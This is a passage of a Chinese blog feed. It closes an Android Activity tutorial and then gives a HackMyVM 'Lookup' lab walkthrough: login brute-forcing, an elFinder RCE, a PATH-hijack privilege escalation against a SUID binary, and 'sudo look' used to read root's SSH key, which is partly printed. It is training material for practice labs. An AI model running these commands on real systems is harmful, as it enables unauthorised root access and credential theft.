最主要是我们要知道我们此时还是能在前台看见app，我们依旧可见。</p></li><li><p><strong>onStop()</strong>：Activity 不再可见时调用，可能被销毁或切换到后台。</p></li><li><p><strong>onDestroy()</strong>：Activity 被销毁时调用，通常是当用户关闭应用或系统资源不足时。</p></li></ol><h5 id="周期调用"><a href="#周期调用" class="headerlink" title="周期调用"></a>周期调用</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">&quot;ActivityLifecycle&quot;</span>, <span class="string">&quot;onDestroy called&quot;</span>);</span><br><span class="line"></span><br><span class="line">这是日志类，我们通过日志类进行调用</span><br></pre></td></tr></table></figure><h4 id="Activity-与任务栈"><a href="#Activity-与任务栈" class="headerlink" title="Activity 与任务栈"></a>Activity 与任务栈</h4><p>每个 Activity 都存在于一个任务栈（Task Stack）中。当你启动一个新的 Activity 时，它会被压入栈顶，用户按下返回键时，Activity 会从栈中移除，返回到上一个 Activity。这个机制确保了应用的页面导航顺序。</p><h4 id="UI-与-Activity-的绑定"><a href="#UI-与-Activity-的绑定" class="headerlink" title="UI 与 Activity 的绑定"></a>UI 与 Activity 的绑定</h4><p>通常，Activity 会关联一个 <strong>XML 布局文件</strong>，这个文件定义了 Activity 的用户界面。通过 <code>setContentView()</code> 方法，你可以将布局文件绑定到 Activity：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="comment">// 设置 Activity 的布局</span></span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在布局文件中，你定义了按钮、文本框等 UI 元素。通过 <strong>findViewById()</strong>，你可以在 Activity 中访问并操作这些元素：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">myButton</span> <span class="operator">=</span> findViewById(R.id.my_button);</span><br><span class="line">myButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="comment">// 处理按钮点击事件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">- **findViewById**：这个方法用于在当前的布局中查找一个视图（比如按钮），你需要传入你想找到的视图的 ID（在这个例子中是 `R.id.my_button`）。</span><br><span class="line">    </span><br><span class="line">- **R.id.my_button**：这表示在 XML 布局文件中为这个按钮指定的唯一标识符（例如，`res/layout/activity_main.xml`）。</span><br><span class="line">    </span><br><span class="line">- **类型转换**：因为 `findViewById()` 返回的是一个通用的 `View` 类型，你需要将其转换为 `Button` 类型。在这里，由于你已经将 `myButton` 声明为 `Button` 类型，转换是隐式的（Java 会在知道类型的情况下自动进行转换）。</span><br><span class="line"></span><br><span class="line"><span class="comment">//匿名类</span></span><br><span class="line">- **`myButton.setOnClickListener(...)`**：</span><br><span class="line">    </span><br><span class="line">    - `setOnClickListener` 是 `Button` 类的一个方法，用于设置一个监听器来处理按钮的点击事件。</span><br><span class="line">    - 当用户点击这个按钮时，会调用指定的监听器。</span><br><span class="line">- **`<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;...&#125;`**：</span><br><span class="line">    </span><br><span class="line">    - 这是一个匿名内部类的实现，`View.OnClickListener` 是一个接口，定义了响应点击事件的方法。</span><br><span class="line">    - `<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()` 创建了这个接口的一个实例，并实现了它的方法。</span><br><span class="line">- **`<span class="meta">@Override</span>`**：</span><br><span class="line">    </span><br><span class="line">    - 这是一个注解，表示接下来的方法是对父类或接口方法的重写。在这里，它表示重写了 `OnClickListener` 接口中的 `onClick` 方法。</span><br><span class="line">- **`<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;...&#125;`**：</span><br><span class="line">    </span><br><span class="line">    - `onClick` 是接口中的方法，当按钮被点击时会被自动调用。</span><br><span class="line">    - 参数 `View v` 是被点击的视图的引用，通常在这里可以使用来确定是哪个按钮被点击（如果在同一个活动中有多个按钮）。</span><br><span class="line">- **`<span class="comment">// 处理按钮点击事件`**：</span></span><br><span class="line">    </span><br><span class="line">    - 这个注释是指你可以在这个方法体内编写代码，以处理按钮被点击时的逻辑，比如显示一个消息、启动另一个活动、更新 UI 等。</span><br></pre></td></tr></table></figure><blockquote><p>其实有没有想过一个问题，我们的activity交互和用户交互为什么必须写在周期方法中。因为我们需要一个入口，来把整个程序串起来. 同时我们习惯把东西放在oncreat方法因为一个activity开始的时候我们就可以把所有的一些监听设备都准备好，用户一点击我们就调用。</p></blockquote><h5 id="相关控件类"><a href="#相关控件类" class="headerlink" title="相关控件类"></a>相关控件类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="type">Button</span> <span class="variable">myButton</span> <span class="operator">=</span> findViewById(R.id.button);  </span><br><span class="line"><span class="type">TextView</span> <span class="variable">myTextView</span> <span class="operator">=</span> findViewById(R.id.textView2);</span><br></pre></td></tr></table></figure><h4 id="Activity-之间的跳转与交互"><a href="#Activity-之间的跳转与交互" class="headerlink" title="Activity 之间的跳转与交互"></a>Activity 之间的跳转与交互</h4><blockquote><p>在应用程序中，你可能会有多个 Activity，用户可以通过不同的页面进行操作。你可以使用 <strong>Intent</strong> 在 Activity 之间跳转和传递数据。</p></blockquote><p>采用最新的跳转方式 ActivityResultLauncher，首先我们模拟从A到B进行操作，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从当前 Activity 跳转到另一个 Activity</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(CurrentActivity.<span class="built_in">this</span>, NextActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;hello&quot;</span>); <span class="comment">// 发送数据</span></span><br></pre></td></tr></table></figure><p>在putExtra参数中 bundle也是一个重要的参数,<code>Bundle</code> 是 Android 中一个非常灵活的数据容器，它可以存储多种类型的数据，包括基本数据类型、字符串、甚至其他 <code>Bundle</code> 对象或实现了 <code>Parcelable</code> 接口的对象。当你需要传递复杂数据结构或者大量数据时，使用 <code>Bundle</code> 可以是一个更好的选择。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">bundle.putString(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">bundle.putInt(<span class="string">&quot;key2&quot;</span>, <span class="number">123</span>);</span><br><span class="line"><span class="comment">// ...可以继续添加更多的键值对</span></span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, TargetActivity.class);</span><br><span class="line">intent.putExtras(bundle);</span><br><span class="line">activityResultLauncher.launch(intent); <span class="comment">// 启动 Activity B  启动B</span></span><br></pre></td></tr></table></figure><p>启动B activity之后可以看到在B中，可以设置响应参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"> <span class="comment">// 处理数据...</span></span><br><span class="line"> <span class="type">TextView</span> <span class="variable">myTextView1</span> <span class="operator">=</span> findViewById(R.id.textView3);</span><br><span class="line"> myTextView1.setText(value);</span><br><span class="line"> <span class="comment">// 返回结果给 Activity A</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">returnIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"> returnIntent.putExtra(<span class="string">&quot;responseKey&quot;</span>, <span class="string">&quot;responseValue&quot;</span>);</span><br><span class="line"> setResult(RESULT_OK, returnIntent);   <span class="comment">// 直接返回 消息</span></span><br><span class="line"> finish(); <span class="comment">// 结束 Activity B</span></span><br></pre></td></tr></table></figure><p>响应数据根据操作进行接收并且返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">activityResultLauncher = registerForActivityResult(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ActivityResultContracts</span>.StartActivityForResult(),</span><br><span class="line">                result -&gt; &#123;</span><br><span class="line">                    <span class="comment">// 处理返回结果</span></span><br><span class="line">                    <span class="keyword">if</span> (result.getResultCode() == RESULT_OK) &#123;</span><br><span class="line">                        <span class="type">Intent</span> <span class="variable">data</span> <span class="operator">=</span> result.getData();</span><br><span class="line">                        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> data != <span class="literal">null</span> ? data.getStringExtra(<span class="string">&quot;responseKey&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">// 根据响应处理数据</span></span><br><span class="line">                        myTextView1.setText(response);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);  </span><br></pre></td></tr></table></figure><p>段代码是使用 Android Jetpack 的 <code>ActivityResultContracts</code> 类来注册一个 <code>ActivityResultLauncher</code>，用于处理另一个 <code>Activity</code> 的启动和结果返回。这不仅仅是处理另一个 <code>Activity</code> 的响应，它可以用来处理任何启动 <code>Activity</code> ForResult 请求的结果</p><ul><li><p><strong><code>getIntent().getStringExtra(&quot;key&quot;)</code></strong>：</p><ul><li>通常在 <code>onCreate()</code> 或 <code>onStart()</code> 方法中使用。</li><li>这个方法用于接收来自启动该 Activity 的 Intent 的数据，通常在 Activity 被创建时就能获取到。</li></ul></li><li><p><strong><code>ActivityResultLauncher</code></strong>：</p><ul><li>这种方法是在启动另一个 Activity 时注册一个结果回调。</li><li>当启动的 Activity 结束并返回结果时，回调中的 Lambda 表达式会被执行，这时你可以通过 <code>result.getData()</code> 获取返回的 Intent 数据。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android移动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android移动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm-Lookup</title>
      <link href="/2024/10/10/Hackmyvm-Lookup/"/>
      <url>/2024/10/10/Hackmyvm-Lookup/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00信息收集"><a href="#0x00信息收集" class="headerlink" title="0x00信息收集"></a>0x00信息收集</h4><h5 id="0x01端口扫描"><a href="#0x01端口扫描" class="headerlink" title="0x01端口扫描"></a>0x01端口扫描</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:0A:44:CF (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line"></span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Did not follow redirect to http://lookup.hmv</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="0x02目录扫描"><a href="#0x02目录扫描" class="headerlink" title="0x02目录扫描"></a>0x02目录扫描</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br></pre></td></tr></table></figure><h4 id="0x10web"><a href="#0x10web" class="headerlink" title="0x10web"></a>0x10web</h4><p>  根据端口开放情况来看，只能根据web先来看，web页面访问是一个登陆界面。并且可以根据返回包可以来判断用户是否存在<br>  <em>用户存在</em></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wrong password. Please try again.  </span><br><span class="line">Redirecting in 3 seconds.</span><br></pre></td></tr></table></figure><p><em>用户不存在</em></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wrong username or password. Please try again.  </span><br><span class="line">Redirecting in 3 seconds.</span><br></pre></td></tr></table></figure><p>根据响应包特征先爆破出用户名，之后根据用户名爆破出密码。进行第一步的突破验证。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001104704.png" alt="image.png"></p><p>爆破出用户为admin 和jose，因此针对两个用户进行弱密码爆破<br>爆破可得</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:password123</span><br><span class="line">jose:password123</span><br></pre></td></tr></table></figure><h5 id="0x11-get-shell"><a href="#0x11-get-shell" class="headerlink" title="0x11 get_shell"></a>0x11 get_shell</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001205911.png" alt="image.png"><br>登陆之后可以查看界面，我们可以看到这是一个文件管理器。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001210007.png" alt="image.png"><br>找到了对应的版本，可以看到是elFinder的2.1.47版本，有对应的rce。直接利用nday拿到权限。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001224513.png" alt="image.png"></p><h4 id="0x20-后渗透"><a href="#0x20-后渗透" class="headerlink" title="0x20 后渗透"></a>0x20 后渗透</h4><p>  针对于这一点其实我个人是觉得有点像ctf了。我们找到赋予了suid的一些命令。<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm 04000  2&gt;/dev/null </span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /usr/sbin/pwm</span><br><span class="line">-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm</span><br></pre></td></tr></table></figure><p>  看过wp才发现这是pwm文件有问题。直接利用meterpreter download 将pwm下载下来。</p><h5 id="0x21pwm分析"><a href="#0x21pwm分析" class="headerlink" title="0x21pwm分析"></a>0x21pwm分析</h5><p><strong>运行程序</strong><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241009111033.png" alt="image.png"></p><p>  x64位程序使用ida反编译，拿到伪代码，分析一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-131h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+10h] [rbp-130h]</span></span><br><span class="line">  FILE *v6; <span class="comment">// [rsp+18h] [rbp-128h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">64</span>]; <span class="comment">// [rsp+20h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [rsp+60h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> filename[<span class="number">104</span>]; <span class="comment">// [rsp+D0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[!] Running &#x27;id&#x27; command to extract the username and user ID (UID)&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x64u</span>LL, <span class="string">&quot;id&quot;</span>);</span><br><span class="line">  stream = popen(s, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_fscanf(stream, <span class="string">&quot;uid=%*u(%[^)])&quot;</span>, v7) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[!] ID: %s\n&quot;</span>, v7);</span><br><span class="line">      pclose(stream);</span><br><span class="line">      <span class="built_in">snprintf</span>(filename, <span class="number">0x64u</span>LL, <span class="string">&quot;/home/%s/.passwords&quot;</span>, v7);</span><br><span class="line">      v6 = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = fgetc(v6);</span><br><span class="line">          <span class="keyword">if</span> ( v4 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">putchar</span>(v4);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(v6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] File /home/%s/.passwords not found\n&quot;</span>, v7);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] Error reading username from id command\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] Error executing id command\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先运行id命令将id命令结果写入数组，之后进行读取，如果能读到内容。就进行下一步</li><li>下一步匹配uid&#x3D;%*u(%[^)])  对应的uid&#x3D;后的内容将括号内的内容写入 V7</li><li>&#x2F;home&#x2F;%s&#x2F;.passwords 读取对应v7的home文件夹下面的文件夹的内容</li></ol><blockquote><p>分析到这里其实我们已经发现，首先这个pwm文件是由suid权限的。并且对于&#x2F;home只有think 一个用户，我们可能就是要利用id命令，送一个think字符串进去从而读取&#x2F;home下的 think的password。 </p></blockquote><h5 id="0x22伪造id"><a href="#0x22伪造id" class="headerlink" title="0x22伪造id"></a>0x22伪造id</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">首先改变PATH</span></span><br><span class="line">PATH=/tmp:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;echo &quot;uid=0(think)&quot;&#x27; &gt; id</span><br><span class="line">chmod +x id</span><br></pre></td></tr></table></figure><p>此时再运行pwm文件可以看到我们已经拿到&#x2F;home&#x2F;think&#x2F;.password的内容</p><h5 id="0x23横向think用户"><a href="#0x23横向think用户" class="headerlink" title="0x23横向think用户"></a>0x23横向think用户</h5><p>  经过不懈的努力，我们终于拿到了think用户的密码候选，我们利用hydra进行爆破。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241009210529.png" alt="image.png"><br>成功拿到对应的ssh的密码进行登陆。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh think@192.168.221.76 </span><br></pre></td></tr></table></figure><h5 id="0x24权限提升"><a href="#0x24权限提升" class="headerlink" title="0x24权限提升"></a>0x24权限提升</h5><p>  查询到sudo 权限有一个look可以为我们所用。但是此时可以看到&#x2F;etc&#x2F;passwd  和&#x2F;etc&#x2F;shadow 因为我们有root权限，所以可以根据root权限进行操作。但是事情总是不尽如人意，并没有爆出对应的root密码。之后想到如果我们能拿到root的ssh私钥，我们照样可以针对于root用户进行一个密钥验证。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=/root/.ssh/id_rsa</span><br><span class="line">sudo look &#x27;&#x27; &quot;$LFILE&quot;</span><br></pre></td></tr></table></figure><p>查看root下的 .ssh&#x2F;id_rsa，拿到私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR</span><br><span class="line">Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR</span><br><span class="line">j7eIpw50J7PGPNG7RAgbP5tJ2NcsFYAifmxMrJPVR/+ybAIVbB+ya/D5r9DYPmatUTLlHD</span><br><span class="line">bV55xi6YcfV7rjbOpjRj8hgubYgjL26BwszbaHKSkI+NcVNPmgquy5Xw8gh3XciFhNLqmd</span><br><span class="line">ISF9fxn5i1vQDB318owoPPZB1rIuMPH3C0SIno42FiqFO/fb1/wPHGasBmLzZF6Fr8/EHC</span><br><span class="line">4wRj9tqsMZfD8xkk2FACtmAFH90ZHXg5D+pwujPDQAuULODP8Koj4vaMKu2CgH3+8I3xRM</span><br><span class="line">hufqHa1+Qe3Hu++7qISEWFHgzpRMFtjPFJEGRzzh2x8F+wozctvn3tcHRv321W5WJGgzhd</span><br><span class="line">k5ECnuu8Jzpg25PEPKrvYf+lMUQebQSncpcrffr9AAAFiJB/j92Qf4/dAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKbZtvg4qVX1DGPu4PS3Jn/4dt0wh+6ikYOD3p5bYvUSltly0gecEUHKstc0RQyr</span><br><span class="line">UUBoX06vmH1X26CQTwnyh3aUKjP8w2//2ZZ5cAsCkOV8k0FP7x30Tn1NKZ0Y+3iKcOdCez</span><br><span class="line">xjzRu0QIGz+bSdjXLBWAIn5sTKyT1Uf/smwCFWwfsmvw+a/Q2D5mrVEy5Rw21eecYumHH1</span><br><span class="line">e642zqY0Y/IYLm2IIy9ugcLM22hykpCPjXFTT5oKrsuV8PIId13IhYTS6pnSEhfX8Z+Ytb</span><br><span class="line">0Awd9fKMKDz2QdayLjDx9wtEiJ6ONhYqhTv329f8DxxmrAZi82Reha/PxBwuMEY/barDGX</span><br><span class="line">w/MZJNhQArZgBR/dGR14OQ/qcLozw0ALlCzgz/CqI+L2jCrtgoB9/vCN8UTIbn6h2tfkHt</span><br><span class="line">x7vvu6iEhFhR4M6UTBbYzxSRBkc84dsfBfsKM3Lb597XB0b99tVuViRoM4XZORAp7rvCc6</span><br><span class="line">YNuTxDyq72H/pTFEHm0Ep3KXK336/QAAAAMBAAEAAAGBAJ4t2wO6G/eMyIFZL1Vw6QP7Vx</span><br><span class="line">zdbJE0+AUZmIzCkK9MP0zJSQrDz6xy8VeKi0e2huIr0Oc1G7kA+QtgpD4G+pvVXalJoTLl</span><br><span class="line">+K9qU2lstleJ4cTSdhwMx/iMlb4EuCsP/HeSFGktKH9yRJFyQXIUx8uaNshcca/xnBUTrf</span><br><span class="line">05QH6a1G44znuJ8QvGF0UC2htYkpB2N7ZF6GppUybXeNQi6PnUKPfYT5shBc3bDssXi5GX</span><br><span class="line">Nn3QgK/GHu6NKQ8cLaXwefRUD6NBOERQtwTwQtQN+n/xIs77kmvCyYOxzyzgWoS2zkhXUz</span><br><span class="line">YZyzk8d2PahjPmWcGW3j3AU3A3ncHd7ga8K9zdyoyp6nCF+VF96DpZSpS2Oca3T8yltaR1</span><br><span class="line">1fkofhBy75ijNQTXUHhAwuDaN5/zGfO+HS6iQ1YWYiXVZzPsktV4kFpKkUMklC9VjlFjPi</span><br><span class="line">t1zMCGVDXu2qgfoxwsxRwknKUt75osVPN9HNAU3LVqviencqvNkyPX9WXpb+z7GUf7FQAA</span><br><span class="line">AMEAytl5PGb1fSnUYB2Q+GKyEk/SGmRdzV07LiF9FgHMCsEJEenk6rArffc2FaltHYQ/Hz</span><br><span class="line">w/GnQakUjYQTNnUIUqcxC59SvbfAKf6nbpYHzjmWxXnOvkoJ7cYZ/sYo5y2Ynt2QcjeFxn</span><br><span class="line">vD9I8ACJBVQ8LYUffvuQUHYTTkQO1TnptZeWX7IQml0SgvucgXdLekMNu6aqIh71AoZYCj</span><br><span 